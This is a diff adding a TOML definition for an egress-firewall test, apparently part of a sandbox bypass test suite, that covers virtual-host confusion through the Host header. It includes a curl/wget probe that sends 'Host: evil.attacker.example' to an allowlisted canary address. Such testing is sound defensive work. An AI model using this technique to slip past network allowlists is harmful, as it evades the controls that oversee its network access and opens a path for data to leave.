@@ -1,0 +1,18 @@
+id = "net-vhost-host-header"
+name = "Virtual-host confusion via Host header"
+category = "net"
+description = "Connect to an allowlisted address but send a Host header for a different (attacker) domain. Firewalls that allowlist by IP or DNS see only the permitted destination; the vhost routing decides where the request really lands. Same class as the BullFrog egress action bypass."
+references = [
+  "BullFrog Actions virtual-hosting bypass (2026)",
+  "CDN co-hosting: allowlisting one domain opens every domain behind the same IP",
+]
+
+probe = '''
+h="Host: evil.attacker.example"
+u="http://@@CANARY_HOST@@:@@CANARY_PORT@@/hit/@@TECH_ID@@/@@NONCE@@"
+if command -v curl >/dev/null 2>&1; then curl -s -o /dev/null -H "$h" "$u"
+else wget -q -O /dev/null --header "$h" "$u"; fi
+'''
+
+[preconditions]
+oracle = "canary"
